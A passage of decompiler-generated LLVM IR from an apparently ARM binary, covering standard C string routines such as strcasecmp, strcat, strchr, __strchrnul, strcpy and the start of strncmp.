  %v1_ff50 = load i32, i32* %r5.global-to-local, align 4
  %v2_ff50 = add i32 %v1_ff50, -28
  %v3_ff50 = inttoptr i32 %v2_ff50 to i32*
  store i32 %v0_ff50, i32* %v3_ff50, align 4
  %v0_ff54 = load i32, i32* @ip, align 4
  %v1_ff54 = load i32, i32* %r5.global-to-local, align 4
  %v2_ff54 = add i32 %v1_ff54, -24
  %v3_ff54 = inttoptr i32 %v2_ff54 to i32*
  store i32 %v0_ff54, i32* %v3_ff54, align 4
  %v0_ff58 = load i32, i32* @ip, align 4
  %v1_ff58 = load i32, i32* %r5.global-to-local, align 4
  %v2_ff58 = add i32 %v1_ff58, -20
  %v3_ff58 = inttoptr i32 %v2_ff58 to i32*
  store i32 %v0_ff58, i32* %v3_ff58, align 4
  %v2_ff5c = xor i1 %v2_ff30, true
  %v3_ff5c = or i1 %v7_ff30, %v2_ff5c
  br i1 %v3_ff5c, label %dec_label_pc_ff90, label %dec_label_pc_ff60

dec_label_pc_ff60:                                ; preds = %dec_label_pc_ff18
  %v0_ff60 = load i32, i32* %r6.global-to-local, align 4
  %v1_ff60 = load i32, i32* %r7.global-to-local, align 4
  %v2_ff60 = add i32 %v1_ff60, %v0_ff60
  store i32 %v2_ff60, i32* @r2, align 4
  br label %dec_label_pc_ff64

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ff64, %dec_label_pc_ff60
  %v0_ff6c = phi i32 [ %v1_ff88, %dec_label_pc_ff64 ], [ %v2_ff60, %dec_label_pc_ff60 ]
  %v0_ff64 = load i32, i32* %lr.global-to-local, align 4
  %v1_ff64 = add i32 %v0_ff64, -32
  store i32 %v1_ff64, i32* %lr.global-to-local, align 4
  %v2_ff68 = icmp ugt i32 %v1_ff64, 30
  %v7_ff68 = icmp eq i32 %v1_ff64, 31
  %v1_ff6c = inttoptr i32 %v0_ff6c to i32*
  %v2_ff6c = load i32, i32* @r3, align 4
  store i32 %v2_ff6c, i32* %v1_ff6c, align 4
  %v3_ff6c = add i32 %v0_ff6c, 4
  %v4_ff6c = inttoptr i32 %v3_ff6c to i32*
  %v5_ff6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_ff6c, i32* %v4_ff6c, align 4
  %v0_ff70 = load i32, i32* @r3, align 4
  %v1_ff70 = load i32, i32* @r2, align 4
  %v2_ff70 = add i32 %v1_ff70, 8
  %v3_ff70 = inttoptr i32 %v2_ff70 to i32*
  store i32 %v0_ff70, i32* %v3_ff70, align 4
  %v0_ff74 = load i32, i32* %r4.global-to-local, align 4
  %v1_ff74 = load i32, i32* @r2, align 4
  %v2_ff74 = add i32 %v1_ff74, 12
  %v3_ff74 = inttoptr i32 %v2_ff74 to i32*
  store i32 %v0_ff74, i32* %v3_ff74, align 4
  %v0_ff78 = load i32, i32* @r3, align 4
  %v1_ff78 = load i32, i32* @r2, align 4
  %v2_ff78 = add i32 %v1_ff78, 16
  %v3_ff78 = inttoptr i32 %v2_ff78 to i32*
  store i32 %v0_ff78, i32* %v3_ff78, align 4
  %v0_ff7c = load i32, i32* %r4.global-to-local, align 4
  %v1_ff7c = load i32, i32* @r2, align 4
  %v2_ff7c = add i32 %v1_ff7c, 20
  %v3_ff7c = inttoptr i32 %v2_ff7c to i32*
  store i32 %v0_ff7c, i32* %v3_ff7c, align 4
  %v0_ff80 = load i32, i32* @r3, align 4
  %v1_ff80 = load i32, i32* @r2, align 4
  %v2_ff80 = add i32 %v1_ff80, 24
  %v3_ff80 = inttoptr i32 %v2_ff80 to i32*
  store i32 %v0_ff80, i32* %v3_ff80, align 4
  %v0_ff84 = load i32, i32* %r4.global-to-local, align 4
  %v1_ff84 = load i32, i32* @r2, align 4
  %v2_ff84 = add i32 %v1_ff84, 28
  %v3_ff84 = inttoptr i32 %v2_ff84 to i32*
  store i32 %v0_ff84, i32* %v3_ff84, align 4
  %v0_ff88 = load i32, i32* @r2, align 4
  %v1_ff88 = add i32 %v0_ff88, 32
  store i32 %v1_ff88, i32* @r2, align 4
  %v2_ff8c = xor i1 %v7_ff68, true
  %v3_ff8c = and i1 %v2_ff68, %v2_ff8c
  br i1 %v3_ff8c, label %dec_label_pc_ff64, label %dec_label_pc_ff90.loopexit

dec_label_pc_ff90.loopexit:                       ; preds = %dec_label_pc_ff64
  store i1 %v2_ff68, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ff68, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ff90

dec_label_pc_ff90:                                ; preds = %dec_label_pc_ff90.loopexit, %dec_label_pc_ff18, %dec_label_pc_ff00, %dec_label_pc_feb8, %dec_label_pc_fea0, %dec_label_pc_fe88, %entry, %dec_label_pc_fec8
  %v2_ff90 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_ff90, i32* @r4, align 4
  %v1_ff94 = load i32, i32* @r0, align 4
  ret i32 %v1_ff94

; uselistorder directives
  uselistorder i32 %v1_ff88, { 1, 0 }
  uselistorder i1 %v7_ff68, { 1, 0 }
  uselistorder i32 %v0_ff6c, { 1, 0 }
  uselistorder i32 %v0_ff00, { 1, 0 }
  uselistorder i32 %v2_fee0, { 1, 0, 2 }
  uselistorder i32 %v1_fedc, { 2, 1, 0, 3 }
  uselistorder i32 %v1_fecc, { 2, 1, 0 }
  uselistorder i32 %v0_feb8, { 1, 0 }
  uselistorder i32 %v0_fea0, { 1, 0 }
  uselistorder i32 %v0_fe88, { 1, 0 }
  uselistorder i32 %v0_fe7c, { 2, 1, 0, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 9, 10, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 9, 10, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 -24, { 4, 1, 0, 2, 3 }
  uselistorder i32 30, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_ff90, { 0, 1, 2, 7, 3, 4, 5, 6 }
}

define i32 @strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_ff98 = load i32, i32* @r4, align 4
  store i32 %v3_ff98, i32* %stack_var_-16, align 4
  %v3_ff9c = load i8, i8* %arg1, align 1
  %v4_ff9c = zext i8 %v3_ff9c to i32
  store i32 %v4_ff9c, i32* @r2, align 4
  %v2_ffa0 = icmp eq i8 %v3_ff9c, 0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_ffa0, label %dec_label_pc_fff4, label %dec_label_pc_ffe8

dec_label_pc_ffb4:                                ; preds = %dec_label_pc_ffe8
  %v3_ffe8 = zext i8 %v2_ffe8 to i32
  %v9_ffb4 = icmp eq i32 %v0_ffb8, %v3_ffe8
  br i1 %v9_ffb4, label %dec_label_pc_ffd8, label %dec_label_pc_ffc0

dec_label_pc_ffc0:                                ; preds = %dec_label_pc_ffb4
  %v1_ffc0 = call i32 @tolower(i32 %v0_ffb8)
  %v0_ffc8 = load i32, i32* %r5.global-to-local, align 4
  %v1_ffc8 = inttoptr i32 %v0_ffc8 to i8*
  %v2_ffc8 = load i8, i8* %v1_ffc8, align 1
  %v3_ffc8 = zext i8 %v2_ffc8 to i32
  %v1_ffcc = call i32 @tolower(i32 %v3_ffc8)
  %v9_ffd0 = icmp eq i32 %v1_ffc0, %v1_ffcc
  %v0_ffd8.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v9_ffd0, label %dec_label_pc_ffc0.dec_label_pc_ffd8_crit_edge, label %dec_label_pc_10014

dec_label_pc_ffc0.dec_label_pc_ffd8_crit_edge:    ; preds = %dec_label_pc_ffc0
  %v0_ffe0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ffd8

dec_label_pc_ffd8:                                ; preds = %dec_label_pc_ffc0.dec_label_pc_ffd8_crit_edge, %dec_label_pc_ffb4
  %v0_ffe0 = phi i32 [ %v0_ffe0.pre, %dec_label_pc_ffc0.dec_label_pc_ffd8_crit_edge ], [ %v0_ffe8, %dec_label_pc_ffb4 ]
  %v0_ffd8 = phi i32 [ %v0_ffd8.pre, %dec_label_pc_ffc0.dec_label_pc_ffd8_crit_edge ], [ %v0_ffd83, %dec_label_pc_ffb4 ]
  %v1_ffd8 = add i32 %v0_ffd8, 1
  %v2_ffd8 = inttoptr i32 %v1_ffd8 to i8*
  %v3_ffd8 = load i8, i8* %v2_ffd8, align 1
  %v4_ffd8 = zext i8 %v3_ffd8 to i32
  store i32 %v4_ffd8, i32* @r2, align 4
  store i32 %v1_ffd8, i32* %r6.global-to-local, align 4
  %v2_ffdc = icmp eq i8 %v3_ffd8, 0
  %v1_ffe0 = add i32 %v0_ffe0, 1
  store i32 %v1_ffe0, i32* %r5.global-to-local, align 4
  br i1 %v2_ffdc, label %dec_label_pc_fff4, label %dec_label_pc_ffe8

dec_label_pc_ffe8:                                ; preds = %entry, %dec_label_pc_ffd8
  %v0_ffd83 = phi i32 [ %v1_ffd8, %dec_label_pc_ffd8 ], [ %tmp, %entry ]
  %v0_ffb8 = phi i32 [ %v4_ffd8, %dec_label_pc_ffd8 ], [ %v4_ff9c, %entry ]
  %v0_ffe8 = phi i32 [ %v1_ffe0, %dec_label_pc_ffd8 ], [ %arg2, %entry ]
  %v1_ffe8 = inttoptr i32 %v0_ffe8 to i8*
  %v2_ffe8 = load i8, i8* %v1_ffe8, align 1
  %v2_ffec = icmp eq i8 %v2_ffe8, 0
  br i1 %v2_ffec, label %dec_label_pc_fff4, label %dec_label_pc_ffb4

dec_label_pc_fff4:                                ; preds = %dec_label_pc_ffe8, %dec_label_pc_ffd8, %entry, %dec_label_pc_10014
  %v0_fff4 = phi i32 [ %v4_ff9c, %entry ], [ %v3_10014, %dec_label_pc_10014 ], [ %v0_ffb8, %dec_label_pc_ffe8 ], [ %v4_ffd8, %dec_label_pc_ffd8 ]
  %v1_fff8 = call i32 @tolower(i32 %v0_fff4)
  %v0_10000 = load i32, i32* %r5.global-to-local, align 4
  %v1_10000 = inttoptr i32 %v0_10000 to i8*
  %v2_10000 = load i8, i8* %v1_10000, align 1
  %v3_10000 = zext i8 %v2_10000 to i32
  %v1_10004 = call i32 @tolower(i32 %v3_10000)
  %v2_10008 = sub i32 %v1_fff8, %v1_10004
  %v2_1000c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1000c, i32* @r4, align 4
  ret i32 %v2_10008

dec_label_pc_10014:                               ; preds = %dec_label_pc_ffc0
  %v1_10014 = inttoptr i32 %v0_ffd8.pre to i8*
  %v2_10014 = load i8, i8* %v1_10014, align 1
  %v3_10014 = zext i8 %v2_10014 to i32
  store i32 %v3_10014, i32* @r2, align 4
  br label %dec_label_pc_fff4

; uselistorder directives
  uselistorder i32 %v3_10014, { 1, 0 }
  uselistorder i32 %v0_ffe8, { 1, 0 }
  uselistorder i32 %v0_ffb8, { 0, 2, 1 }
  uselistorder i32 %v4_ff9c, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_fff4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_ffe8, { 1, 0 }
}

define i32 @__strcasecmp_l(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10020 = load i8, i8* %arg1, align 1
  %v4_10020 = zext i8 %v3_10020 to i32
  %v2_10024 = icmp eq i8 %v3_10020, 0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_10024, label %dec_label_pc_10078, label %dec_label_pc_1006c

dec_label_pc_10038:                               ; preds = %dec_label_pc_1006c
  %v3_1006c = zext i8 %v2_1006c to i32
  %v9_10038 = icmp eq i32 %v0_1003c, %v3_1006c
  br i1 %v9_10038, label %dec_label_pc_1005c, label %dec_label_pc_10044

dec_label_pc_10044:                               ; preds = %dec_label_pc_10038
  %v1_10044 = call i32 @tolower(i32 %v0_1003c)
  %v0_1004c = load i32, i32* %r5.global-to-local, align 4
  %v1_1004c = inttoptr i32 %v0_1004c to i8*
  %v2_1004c = load i8, i8* %v1_1004c, align 1
  %v3_1004c = zext i8 %v2_1004c to i32
  %v1_10050 = call i32 @tolower(i32 %v3_1004c)
  %v9_10054 = icmp eq i32 %v1_10044, %v1_10050
  %v0_1005c.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v9_10054, label %dec_label_pc_10044.dec_label_pc_1005c_crit_edge, label %dec_label_pc_10098

dec_label_pc_10044.dec_label_pc_1005c_crit_edge:  ; preds = %dec_label_pc_10044
  %v0_10064.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1005c

dec_label_pc_1005c:                               ; preds = %dec_label_pc_10044.dec_label_pc_1005c_crit_edge, %dec_label_pc_10038
  %v0_10064 = phi i32 [ %v0_10064.pre, %dec_label_pc_10044.dec_label_pc_1005c_crit_edge ], [ %v0_1006c, %dec_label_pc_10038 ]
  %v0_1005c = phi i32 [ %v0_1005c.pre, %dec_label_pc_10044.dec_label_pc_1005c_crit_edge ], [ %v0_1005c3, %dec_label_pc_10038 ]
  %v1_1005c = add i32 %v0_1005c, 1
  %v2_1005c = inttoptr i32 %v1_1005c to i8*
  %v3_1005c = load i8, i8* %v2_1005c, align 1
  %v4_1005c = zext i8 %v3_1005c to i32
  store i32 %v1_1005c, i32* %r6.global-to-local, align 4
  %v2_10060 = icmp eq i8 %v3_1005c, 0
  %v1_10064 = add i32 %v0_10064, 1
  store i32 %v1_10064, i32* %r5.global-to-local, align 4
  br i1 %v2_10060, label %dec_label_pc_10078, label %dec_label_pc_1006c

dec_label_pc_1006c:                               ; preds = %entry, %dec_label_pc_1005c
  %v0_1005c3 = phi i32 [ %v1_1005c, %dec_label_pc_1005c ], [ %tmp, %entry ]
  %v0_1003c = phi i32 [ %v4_1005c, %dec_label_pc_1005c ], [ %v4_10020, %entry ]
  %v0_1006c = phi i32 [ %v1_10064, %dec_label_pc_1005c ], [ %arg2, %entry ]
  %v1_1006c = inttoptr i32 %v0_1006c to i8*
  %v2_1006c = load i8, i8* %v1_1006c, align 1
  %v2_10070 = icmp eq i8 %v2_1006c, 0
  br i1 %v2_10070, label %dec_label_pc_10078, label %dec_label_pc_10038

dec_label_pc_10078:                               ; preds = %dec_label_pc_1006c, %dec_label_pc_1005c, %entry, %dec_label_pc_10098
  %v0_10078 = phi i32 [ %v4_10020, %entry ], [ %v3_10098, %dec_label_pc_10098 ], [ %v0_1003c, %dec_label_pc_1006c ], [ %v4_1005c, %dec_label_pc_1005c ]
  %v1_1007c = call i32 @tolower(i32 %v0_10078)
  %v0_10084 = load i32, i32* %r5.global-to-local, align 4
  %v1_10084 = inttoptr i32 %v0_10084 to i8*
  %v2_10084 = load i8, i8* %v1_10084, align 1
  %v3_10084 = zext i8 %v2_10084 to i32
  %v1_10088 = call i32 @tolower(i32 %v3_10084)
  %v2_1008c = sub i32 %v1_1007c, %v1_10088
  ret i32 %v2_1008c

dec_label_pc_10098:                               ; preds = %dec_label_pc_10044
  %v1_10098 = inttoptr i32 %v0_1005c.pre to i8*
  %v2_10098 = load i8, i8* %v1_10098, align 1
  %v3_10098 = zext i8 %v2_10098 to i32
  br label %dec_label_pc_10078

; uselistorder directives
  uselistorder i32 %v0_1006c, { 1, 0 }
  uselistorder i32 %v0_1003c, { 0, 2, 1 }
  uselistorder i32 %v4_10020, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32)* @tolower, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10078, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1006c, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_100a0 = load i32, i32* @r4, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %v3_100b0 = call i32 @strlen(i8* %arg1)
  %v0_100b4 = load i32, i32* @r4, align 4
  store i32 %v0_100b4, i32* @r1, align 4
  %v2_100b8 = add i32 %tmp, %v3_100b0
  %v2_100bc = call i32 @strcpy(i32 %v2_100b8, i32 %v0_100b4)
  %v0_100c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v3_100a0, i32* @r4, align 4
  ret i32 %v0_100c0

; uselistorder directives
  uselistorder i32 (i32, i32)* @strcpy, { 0, 9, 2, 1, 8, 7, 6, 5, 4, 3 }
}

define i32 @strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_100d0 = load i32, i32* @r4, align 4
  store i32 %v3_100d0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_100d8 = call i32 @__strchrnul()
  %v1_100dc = inttoptr i32 %v0_100d8 to i8*
  %v2_100dc = load i8, i8* %v1_100dc, align 1
  %v3_100dc = zext i8 %v2_100dc to i32
  store i32 %v3_100dc, i32* @r3, align 4
  %v0_100e0 = load i32, i32* @r4, align 4
  %v1_100e0 = urem i32 %v0_100e0, 256
  %v9_100e4 = icmp eq i32 %v1_100e0, %v3_100dc
  br i1 %v9_100e4, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_100f0 = phi i32 [ %v0_100d8, %entry ], [ 0, %bb ]
  %v2_100ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_100ec, i32* @r4, align 4
  ret i32 %v1_100f0

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__strchrnul() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_100f4 = load i32, i32* @r1, align 4
  %v1_100f4 = urem i32 %v0_100f4, 256
  store i32 %v1_100f4, i32* @ip, align 4
  %v2_100f4 = icmp eq i32 %v1_100f4, 0
  %v3_100f8 = load i32, i32* @r4, align 4
  store i32 %v3_100f8, i32* %stack_var_-8, align 4
  %v0_100fc = load i32, i32* @r0, align 4
  store i32 %v0_100fc, i32* %r4.global-to-local, align 4
  br i1 %v2_100f4, label %dec_label_pc_10244, label %dec_label_pc_10120.preheader

dec_label_pc_10120.preheader:                     ; preds = %entry
  %v1_101203 = urem i32 %v0_100fc, 4
  %v2_101204 = icmp eq i32 %v1_101203, 0
  br i1 %v2_101204, label %dec_label_pc_10128, label %dec_label_pc_10108

dec_label_pc_10108:                               ; preds = %dec_label_pc_10120.preheader, %dec_label_pc_1011c
  %v0_1023c = phi i32 [ %v1_1011c, %dec_label_pc_1011c ], [ %v0_100fc, %dec_label_pc_10120.preheader ]
  %v1_10108 = inttoptr i32 %v0_1023c to i8*
  %v2_10108 = load i8, i8* %v1_10108, align 1
  %v2_1010c = icmp eq i8 %v2_10108, 0
  br i1 %v2_1010c, label %dec_label_pc_1023c, label %dec_label_pc_10114

dec_label_pc_10114:                               ; preds = %dec_label_pc_10108
  %v3_10108 = zext i8 %v2_10108 to i32
  %v9_10114 = icmp eq i32 %v3_10108, %v1_100f4
  br i1 %v9_10114, label %dec_label_pc_1023c, label %dec_label_pc_1011c

dec_label_pc_1011c:                               ; preds = %dec_label_pc_10114
  %v1_1011c = add i32 %v0_1023c, 1
  store i32 %v1_1011c, i32* %r4.global-to-local, align 4
  %v1_10120 = urem i32 %v1_1011c, 4
  %v2_10120 = icmp eq i32 %v1_10120, 0
  br i1 %v2_10120, label %dec_label_pc_10128, label %dec_label_pc_10108

dec_label_pc_10128:                               ; preds = %dec_label_pc_1011c, %dec_label_pc_10120.preheader
  %v0_10158 = phi i32 [ %v0_100fc, %dec_label_pc_10120.preheader ], [ %v1_1011c, %dec_label_pc_1011c ]
  %v1_10128 = inttoptr i32 %v0_10158 to i32*
  %v2_10128 = load i32, i32* %v1_10128, align 4
  store i32 %v2_10128, i32* @r1, align 4
  %v1_10138 = add i32 %v2_10128, -16843009
  %v1_1013c = sub i32 -1, %v2_10128
  %v2_10140 = and i32 %v1_1013c, -2139062144
  %v1_10150 = and i32 %v2_10140, %v1_10138
  %v2_10154 = icmp eq i32 %v1_10150, 0
  br i1 %v2_10154, label %dec_label_pc_10160, label %dec_label_pc_10210

dec_label_pc_10160:                               ; preds = %dec_label_pc_10128
  %v2_1016c = mul nuw i32 %v1_100f4, 16843009
  %v2_10170 = xor i32 %v2_10128, %v2_1016c
  %v1_10180 = add i32 %v2_10170, -16843009
  %v1_10184 = sub i32 -1, %v2_10170
  store i32 %v1_10184, i32* @r1, align 4
  %v2_10188 = and i32 %v1_10184, -2139062144
  %v1_10198 = and i32 %v2_10188, %v1_10180
  %v2_1019c = icmp eq i32 %v1_10198, 0
  br i1 %v2_1019c, label %dec_label_pc_101b0, label %dec_label_pc_10210

dec_label_pc_101a8:                               ; preds = %dec_label_pc_101b0
  %v1_101c4 = and i32 %v2_101b4, -2139062144
  %v2_101cc = xor i32 %v1_101c4, -2139062144
  %v1_101c8 = add i32 %v2_101b4, -16843009
  %v1_10208 = and i32 %v2_101cc, %v1_101c8
  %v2_101a8 = icmp eq i32 %v1_10208, 0
  br i1 %v2_101a8, label %dec_label_pc_101b0, label %dec_label_pc_10210.loopexit

dec_label_pc_101b0:                               ; preds = %dec_label_pc_10160, %dec_label_pc_101a8
  %v0_101b0 = phi i32 [ %v1_101b0, %dec_label_pc_101a8 ], [ %v0_10158, %dec_label_pc_10160 ]
  %v1_101b0 = add i32 %v0_101b0, 4
  %v2_101b0 = inttoptr i32 %v1_101b0 to i32*
  %v3_101b0 = load i32, i32* %v2_101b0, align 4
  %v2_101b4 = xor i32 %v3_101b0, %v2_1016c
  %v1_101e0 = add i32 %v3_101b0, -16843009
  %v1_101e4 = sub i32 -1, %v3_101b0
  store i32 %v1_101e4, i32* @r1, align 4
  %v2_101e8 = and i32 %v1_101e4, -2139062144
  %v1_101fc = and i32 %v2_101e8, %v1_101e0
  %v2_10204 = icmp eq i32 %v1_101fc, 0
  br i1 %v2_10204, label %dec_label_pc_101a8, label %dec_label_pc_10210.loopexit

dec_label_pc_10210.loopexit:                      ; preds = %dec_label_pc_101b0, %dec_label_pc_101a8
  br label %dec_label_pc_10210

dec_label_pc_10210:                               ; preds = %dec_label_pc_10210.loopexit, %dec_label_pc_10160, %dec_label_pc_10128
  %v0_10210 = phi i32 [ %v1_101b0, %dec_label_pc_10210.loopexit ], [ %v0_10158, %dec_label_pc_10160 ], [ %v0_10158, %dec_label_pc_10128 ]
  %v1_10210 = inttoptr i32 %v0_10210 to i8*
  %v2_10210 = load i8, i8* %v1_10210, align 1
  %v2_10214 = icmp eq i8 %v2_10210, 0
  br i1 %v2_10214, label %dec_label_pc_10234, label %dec_label_pc_1022c

dec_label_pc_10220:                               ; preds = %dec_label_pc_1022c
  %v1_10220 = add i32 %v0_10220, 1
  %v2_10220 = inttoptr i32 %v1_10220 to i8*
  %v3_10220 = load i8, i8* %v2_10220, align 1
  %v2_10224 = icmp eq i8 %v3_10220, 0
  br i1 %v2_10224, label %dec_label_pc_10234, label %dec_label_pc_1022c

dec_label_pc_1022c:                               ; preds = %dec_label_pc_10210, %dec_label_pc_10220
  %v0_10220 = phi i32 [ %v1_10220, %dec_label_pc_10220 ], [ %v0_10210, %dec_label_pc_10210 ]
  %v0_1022c.in = phi i8 [ %v3_10220, %dec_label_pc_10220 ], [ %v2_10210, %dec_label_pc_10210 ]
  %v0_1022c = zext i8 %v0_1022c.in to i32
  %v9_1022c = icmp eq i32 %v0_1022c, %v1_100f4
  br i1 %v9_1022c, label %dec_label_pc_10234, label %dec_label_pc_10220

dec_label_pc_10234:                               ; preds = %dec_label_pc_1022c, %dec_label_pc_10220, %dec_label_pc_10210, %dec_label_pc_10244, %dec_label_pc_1023c
  %v1_10238 = phi i32 [ %v0_10210, %dec_label_pc_10210 ], [ %v2_10248, %dec_label_pc_10244 ], [ %v0_1023c, %dec_label_pc_1023c ], [ %v0_10220, %dec_label_pc_1022c ], [ %v1_10220, %dec_label_pc_10220 ]
  %v2_10234 = phi i32 [ %v3_100f8, %dec_label_pc_10210 ], [ %v2_10234.pre, %dec_label_pc_10244 ], [ %v3_100f8, %dec_label_pc_1023c ], [ %v3_100f8, %dec_label_pc_1022c ], [ %v3_100f8, %dec_label_pc_10220 ]
  store i32 %v2_10234, i32* @r4, align 4
  ret i32 %v1_10238

dec_label_pc_1023c:                               ; preds = %dec_label_pc_10114, %dec_label_pc_10108
  br label %dec_label_pc_10234

dec_label_pc_10244:                               ; preds = %entry
  %v1_10244 = inttoptr i32 %v0_100fc to i8*
  %v2_10244 = call i32 @strlen(i8* %v1_10244)
  %v1_10248 = load i32, i32* %r4.global-to-local, align 4
  %v2_10248 = add i32 %v1_10248, %v2_10244
  %v2_10234.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10234

; uselistorder directives
  uselistorder i32 %v0_10210, { 1, 0, 2 }
  uselistorder i32 %v1_101e4, { 1, 0 }
  uselistorder i32 %v3_101b0, { 0, 2, 1 }
  uselistorder i32 %v1_101b0, { 0, 2, 1 }
  uselistorder i32 %v1_10184, { 1, 0 }
  uselistorder i32 %v2_10128, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10158, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1011c, { 1, 0, 3, 2 }
  uselistorder i8 %v2_10108, { 1, 0 }
  uselistorder i32 %v0_100fc, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_100f4, { 4, 2, 3, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32 16843009, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10234, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1022c, { 1, 0 }
  uselistorder label %dec_label_pc_101b0, { 1, 0 }
  uselistorder label %dec_label_pc_10108, { 1, 0 }
}

declare i32 @strcmp(i8*, i8*) local_unnamed_addr

define i32 @strcpy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v0_10290 = call i32 @__stpcpy()
  ret i32 %arg1
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_10340 = add i32 %arg3, -1
  %v2_10344 = icmp eq i32 %arg3, 0
  br i1 %v2_10344, label %dec_label_pc_103cc, label %dec_label_pc_10358

dec_label_pc_10358:                               ; preds = %entry
  %v2_10358 = load i8, i8* %arg1, align 1
  %v3_10358 = zext i8 %v2_10358 to i32
  %v2_1035c = icmp eq i8 %v2_10358, 0
  %v0_103c4.pre = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_1035c, label %dec_label_pc_103c4, label %dec_label_pc_10364

dec_label_pc_10364:                               ; preds = %dec_label_pc_10358
  %v1_10364 = inttoptr i32 %v0_103c4.pre to i8*
  %v2_10364 = load i8, i8* %v1_10364, align 1
  %v3_10364 = zext i8 %v2_10364 to i32
  %v2_10368 = icmp eq i8 %v2_10364, 0
  br i1 %v2_10368, label %dec_label_pc_103c8, label %bb21

bb21:                                             ; preds = %dec_label_pc_10364
  %v3_1036c = icmp eq i32 %v1_10340, 0
  br i1 %v3_1036c, label %dec_label_pc_103c8, label %dec_label_pc_10374

dec_label_pc_10374:                               ; preds = %bb21
  %v9_10374 = icmp eq i8 %v2_10358, %v2_10364
  br i1 %v9_10374, label %dec_label_pc_1037c, label %dec_label_pc_103c8

dec_label_pc_1037c:                               ; preds = %dec_label_pc_10374
  br label %dec_label_pc_103b0

dec_label_pc_10384:                               ; preds = %dec_label_pc_103b0
  %v1_10384 = add i32 %v0_10384, -1
  %v1_10388 = inttoptr i32 %v1_103bc to i8*
  %v2_10388 = load i8, i8* %v1_10388, align 1
  %v3_10388 = zext i8 %v2_10388 to i32
  %v2_10394 = icmp eq i8 %v2_10388, 0
  br i1 %v2_10394, label %.thread3, label %.thread2

.thread3:                                         ; preds = %dec_label_pc_10384
  br label %dec_label_pc_103c8

.thread2:                                         ; preds = %dec_label_pc_10384
  %v7_10384 = icmp eq i32 %v0_10384, 1
  br i1 %v7_10384, label %dec_label_pc_103c8, label %dec_label_pc_103a8

dec_label_pc_103a8:                               ; preds = %.thread2
  %v9_103a8 = icmp eq i8 %v3_103b0, %v2_10388
  br i1 %v9_103a8, label %dec_label_pc_103b0, label %dec_label_pc_103c8

dec_label_pc_103b0:                               ; preds = %dec_label_pc_103a8, %dec_label_pc_1037c
  %v0_10384 = phi i32 [ %v1_10384, %dec_label_pc_103a8 ], [ %v1_10340, %dec_label_pc_1037c ]
  %v0_103bc = phi i32 [ %v1_103bc, %dec_label_pc_103a8 ], [ %v0_103c4.pre, %dec_label_pc_1037c ]
  %v0_103b8 = phi i32 [ %v1_103b0, %dec_label_pc_103a8 ], [ %tmp, %dec_label_pc_1037c ]
  %v1_103b0 = add i32 %v0_103b8, 1
  %v2_103b0 = inttoptr i32 %v1_103b0 to i8*
